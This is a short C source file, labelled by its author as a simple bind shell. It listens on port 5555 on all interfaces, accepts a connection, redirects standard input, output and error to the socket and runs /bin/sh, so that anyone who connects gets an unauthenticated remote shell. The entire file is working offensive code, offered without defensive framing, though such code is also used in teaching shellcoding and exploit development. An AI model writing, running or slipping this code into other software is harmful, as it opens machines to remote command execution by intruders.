/*
 * Simple bind shell in C
 *
 * author: @linkavych
 * date: 2022-11-06
 */
#include <stdio.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/socket.h>

#define HOST_IP "0.0.0.0"
#define HOST_PORT 5555

int main(int argc, char *argv[])
{
    struct sockaddr_in sa;
    int result, s;

    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = inet_addr(HOST_IP);
    sa.sin_port = htons(HOST_PORT);

    s = socket(AF_INET, SOCK_STREAM, 0);
    bind(s, (struct sockaddr *)&sa, sizeof(sa));

    listen(s, 0);

    result = accept(s, NULL, NULL);

    for(int i = 0; i < 3; i++)
    {
        dup2(result, i);
    }

    execve("/bin/sh", NULL, NULL);

    return 0;
}
